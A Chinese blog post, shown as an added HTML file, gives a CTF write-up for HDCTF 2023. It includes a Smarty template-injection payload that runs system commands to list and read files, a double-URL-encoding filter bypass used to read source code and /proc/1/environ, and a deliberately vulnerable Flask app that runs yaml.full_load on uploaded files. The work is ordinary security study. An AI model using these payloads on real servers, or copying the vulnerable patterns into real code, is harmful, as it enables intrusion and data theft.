@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="HDCTF 2023(省内赛道) 部分WP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HDCTF 2023(省内赛道)">
+<meta property="og:url" content="http://example.com/post/dd40690e.html">
+<meta property="og:site_name" content="Z1d10t&#39;s Blog">
+<meta property="og:description" content="HDCTF 2023(省内赛道) 部分WP">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165596340-28745076-d8ed-4e46-9793-4e5d6fe9aa23.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165396401-dde8abd9-573b-46cd-ad8d-226bd51cf855.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165410073-d283c8aa-3c61-4053-b5df-999deea9f425.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165707395-5aedfc9c-7b33-4f5f-8cef-67275fe4f7ab.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514003165-ae5d5af3-b1fe-4857-b9c3-8749c4bd9f08.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514196676-0a40092c-feba-4e9c-b7db-48181e2efc24.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514715380-37099247-9a07-43a4-9cd2-067bfface208.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514739750-28c9e6f1-ebd3-4d0e-9735-7a158d95388d.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514766571-03f89872-a08b-47e5-b1e7-b90e9d3eeb92.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682516256550-09f531fb-105e-458e-b1d5-62edbda38d4b.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682518211036-422e9054-fb3e-4dd9-83ca-b93c288dc87a.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517504048-653cd836-870e-46e6-93e7-ab8e3953106f.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517014776-8237fe1d-8919-406f-9912-cfc0abb2a08b.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682517082099-b27ae5c2-2d34-4496-8e96-9155ecfc2a77.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682570503152-ae120381-50eb-43c4-9634-a47cff72b0f9.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682596804773-43900a23-f1bb-4f21-bd92-1258a4af3700.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682596879463-3e74e07c-7f75-48f1-92e4-69d21e9d6a21.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682597458239-a1bc5eba-19bd-4464-afe0-f5582b6f9c02.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682597557792-2a8afbc9-a8a2-4de8-a340-a3415d2e2d08.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682598202760-5e0a4fac-7660-4486-bee9-9ef75f6b6530.png">
+<meta property="article:published_time" content="2023-04-27T13:16:24.000Z">
+<meta property="article:modified_time" content="2023-04-28T14:07:16.859Z">
+<meta property="article:author" content="Z1d10t">
+<meta property="article:tag" content="Smarty模板注入">
+<meta property="article:tag" content="js">
+<meta property="article:tag" content="Yaml反序列化">
+<meta property="article:tag" content="shell反弹">
+<meta property="article:tag" content="quine注入">
+<meta property="article:tag" content="python3解析特性">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165596340-28745076-d8ed-4e46-9793-4e5d6fe9aa23.png">
+
+
+<link rel="canonical" href="http://example.com/post/dd40690e.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/post/dd40690e.html","path":"post/dd40690e.html","title":"HDCTF 2023(省内赛道)"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HDCTF 2023(省内赛道) | Z1d10t's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Z1d10t's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"> </p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-house fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tag fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-rectangle-list fa-fw"></i>分类</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于博主</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Welcome-To-HDCTF-2023"><span class="nav-number">1.1.</span> <span class="nav-text">Welcome To HDCTF 2023</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E4%B8%80%EF%BC%9A"><span class="nav-number">1.1.1.</span> <span class="nav-text">解一：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E4%BA%8C%EF%BC%9A"><span class="nav-number">1.1.2.</span> <span class="nav-text">解二：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SearchMaster"><span class="nav-number">1.2.</span> <span class="nav-text">SearchMaster</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">2.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Normal-Rsa"><span class="nav-number">2.1.</span> <span class="nav-text">Normal_Rsa</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">3.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#hardMisc"><span class="nav-number">3.1.</span> <span class="nav-text">hardMisc</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%EF%BC%9A"><span class="nav-number">4.</span> <span class="nav-text">复现：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#YamiYami"><span class="nav-number">4.1.</span> <span class="nav-text">YamiYami</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="nav-number">4.1.1.</span> <span class="nav-text">非预期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F%EF%BC%9A"><span class="nav-number">4.1.2.</span> <span class="nav-text">预期：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LoginMaster"><span class="nav-number">4.2.</span> <span class="nav-text">LoginMaster</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%8F%E5%B0%BE%E5%B7%B4"><span class="nav-number">5.</span> <span class="nav-text">小尾巴</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z1d10t"
+      src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png">
+  <p class="site-author-name" itemprop="name">Z1d10t</p>
+  <div class="site-description" itemprop="description">welcome to my blog (*^_^*)</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">38</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">73</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/post/dd40690e.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png">
+      <meta itemprop="name" content="Z1d10t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z1d10t's Blog">
+      <meta itemprop="description" content="welcome to my blog (*^_^*)">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="HDCTF 2023(省内赛道) | Z1d10t's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HDCTF 2023(省内赛道)
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-04-27 21:16:24" itemprop="dateCreated datePublished" datetime="2023-04-27T21:16:24+08:00">2023-04-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-04-28 22:07:16" itemprop="dateModified" datetime="2023-04-28T22:07:16+08:00">2023-04-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HDCTF/" itemprop="url" rel="index"><span itemprop="name">HDCTF</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>HDCTF 2023(省内赛道) 部分WP</p>
+<span id="more"></span>
+
+<p>最终排名第七吧 web狗表示web后面几道真的很难,目前刷题还没有做到后几道题目的类型，所以后半阶段真的在坐牢，还是太菜了，努力！！！</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165596340-28745076-d8ed-4e46-9793-4e5d6fe9aa23.png" alt="img"></p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Welcome-To-HDCTF-2023"><a href="#Welcome-To-HDCTF-2023" class="headerlink" title="Welcome To HDCTF 2023"></a>Welcome To HDCTF 2023</h2><h3 id="解一："><a href="#解一：" class="headerlink" title="解一："></a>解一：</h3><p>直接送死</p>
+<h3 id="解二："><a href="#解二：" class="headerlink" title="解二："></a>解二：</h3><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165396401-dde8abd9-573b-46cd-ad8d-226bd51cf855.png" alt="img"></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165410073-d283c8aa-3c61-4053-b5df-999deea9f425.png" alt="img"></p>
+<p>直接输入在console中输入seeeeeeeecret就能拿到</p>
+<h2 id="SearchMaster"><a href="#SearchMaster" class="headerlink" title="SearchMaster"></a>SearchMaster</h2><p>这题拿了一血 开心qwq</p>
+<p>一眼丁真 php的smarty注入</p>
+<p>构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;if system(&#x27;ls /&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">data=&#123;if system(&#x27;cat /flag_13_searchmaster&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682165707395-5aedfc9c-7b33-4f5f-8cef-67275fe4f7ab.png" alt="img"></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Normal-Rsa"><a href="#Normal-Rsa" class="headerlink" title="Normal_Rsa"></a>Normal_Rsa</h2><p>应该是题目出问题了 打开题目flag就有</p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="hardMisc"><a href="#hardMisc" class="headerlink" title="hardMisc"></a>hardMisc</h2><p>也是拿到一个一血</p>
+<p>拖进010一把梭</p>
+<p>末尾 base64解码拿到flag</p>
+<h1 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h1><h2 id="YamiYami"><a href="#YamiYami" class="headerlink" title="YamiYami"></a>YamiYami</h2><p>一道关于session伪造 yaml(一开始一直在搜yami反序列化 还在想为什么搜不到相关文章 真该死啊我)反序列化 shell反弹的题目</p>
+<p>借助这道题目好好学习一下yami漏洞和shell反弹</p>
+<p>进入题目后能看到有三个路由 <code>/read</code>是用来读文件的 <code>/upload</code>是用来上传我们的恶意代码文件的 <code>/pwd </code>字面意思就是告诉我们当前在哪个文档中</p>
+<p>当时做题的时候还以为这道题目难度应该不会很难 还以为是很基础的上传一句话木马去包含然后getshell 看了wp真的怀疑人生</p>
+<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>先说说非预期吧 直接读取环境变量就可以了 我当时也是这么想的 但是我纯脑瘫去读linux系统用户环境信息了</p>
+<p>而且题目环境应该是在docker下</p>
+<p>一开始一直在读<code>/etc/profile</code></p>
+<p> <strong>/etc/profile：</strong> 此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行. 并从/etc/profile.d目录的配置文件中搜集shell的设置。  </p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514003165-ae5d5af3-b1fe-4857-b9c3-8749c4bd9f08.png" alt="img"></p>
+<p>根本没什么用</p>
+<p>应该读环境变量<code>/proc/1/environ</code>（详细可参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/FY_2018/article/details/112986445%EF%BC%89">https://blog.csdn.net/FY_2018/article/details/112986445）</a></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514196676-0a40092c-feba-4e9c-b7db-48181e2efc24.png" alt="img"></p>
+<h3 id="预期："><a href="#预期：" class="headerlink" title="预期："></a>预期：</h3><p>上传一个yami反序列化文件 然后反弹shell去打</p>
+<p>首先先去读源文件 发现做flask的题目 能get到源代码就去努力！</p>
+<p>这里用到了python3解析特性</p>
+<p>如果直接构造payload<code>/read?url=file:///app.py</code> flag字样也被正则了</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514715380-37099247-9a07-43a4-9cd2-067bfface208.png" alt="img"></p>
+<p>发现是不行的 被过滤了</p>
+<p>这里用到了python3的字符解析特性通过双重url编码（全字符）去绕过</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514739750-28c9e6f1-ebd3-4d0e-9735-7a158d95388d.png" alt="img"></p>
+<p>拿到源码</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682514766571-03f89872-a08b-47e5-b1e7-b90e9d3eeb92.png" alt="img"></p>
+<p>源码：</p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line">import os</span><br><span class="line">import re, random, uuid</span><br><span class="line">from flask import *</span><br><span class="line">from werkzeug.utils import *</span><br><span class="line">import yaml</span><br><span class="line">from urllib.request import urlopen</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="keyword">False</span></span><br><span class="line">BLACK_LIST=[<span class="string">&quot;yaml&quot;</span>,<span class="string">&quot;YAML&quot;</span>,<span class="string">&quot;YML&quot;</span>,<span class="string">&quot;yml&quot;</span>,<span class="string">&quot;yamiyami&quot;</span>]</span><br><span class="line">app.config[&#x27;UPLOAD_FOLDER&#x27;]=<span class="string">&quot;/app/uploads&quot;</span></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    session[&#x27;passport&#x27;] = &#x27;YamiYami&#x27;</span><br><span class="line">    <span class="keyword">return</span> &#x27;&#x27;&#x27;</span><br><span class="line">    Welcome to HDCTF2023 &lt;a href=<span class="string">&quot;/read?url=https://baidu.com&quot;</span>&gt;Read somethings&lt;/a&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    Here is the challenge &lt;a href=<span class="string">&quot;/upload&quot;</span>&gt;Upload <span class="keyword">file</span>&lt;/a&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    Enjoy it &lt;a href=<span class="string">&quot;/pwd&quot;</span>&gt;pwd&lt;/a&gt;</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">@app.route(&#x27;/pwd&#x27;)</span><br><span class="line">def pwd():</span><br><span class="line">    <span class="keyword">return</span> str(pwdpath)</span><br><span class="line">@app.route(&#x27;/read&#x27;)</span><br><span class="line">def read():</span><br><span class="line">    try:</span><br><span class="line">        url = request.args.get(&#x27;url&#x27;)</span><br><span class="line">        m = re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        <span class="keyword">if</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        res = urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    except Exception as ex:</span><br><span class="line">        print(str(ex))</span><br><span class="line">    <span class="keyword">return</span> &#x27;no response&#x27;</span><br><span class="line"></span><br><span class="line">def allowed_file(filename):</span><br><span class="line">   for blackstr in BLACK_LIST:</span><br><span class="line">       <span class="keyword">if</span> blackstr in filename:</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def upload_file():</span><br><span class="line">    <span class="keyword">if</span> request.method == &#x27;POST&#x27;:</span><br><span class="line">        <span class="keyword">if</span> &#x27;<span class="keyword">file</span>&#x27; <span class="keyword">not</span> in request.files:</span><br><span class="line">            flash(&#x27;No <span class="keyword">file</span> part&#x27;)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        <span class="keyword">file</span> = request.files[&#x27;<span class="keyword">file</span>&#x27;]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">file</span>.filename == &#x27;&#x27;:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">file</span> <span class="keyword">and</span> allowed_file(<span class="keyword">file</span>.filename):</span><br><span class="line">            filename = secure_filename(<span class="keyword">file</span>.filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.<span class="keyword">exists</span>(&#x27;./uploads/&#x27;):</span><br><span class="line">                os.makedirs(&#x27;./uploads/&#x27;)</span><br><span class="line">            <span class="keyword">file</span>.save(os.path.join(app.config[&#x27;UPLOAD_FOLDER&#x27;], filename))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line">@app.route(&#x27;/boogipop&#x27;)</span><br><span class="line">def load():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>)==<span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile=request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.<span class="keyword">exists</span>(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        with open(LoadedFile) as f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__==&#x27;__main__&#x27;:</span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read()</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="keyword">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    print(app.config[&#x27;SECRET_KEY&#x27;])</span><br></pre></td></tr></table></figure>
+
+<p>发现还有一个<code>/boogipop</code>路由</p>
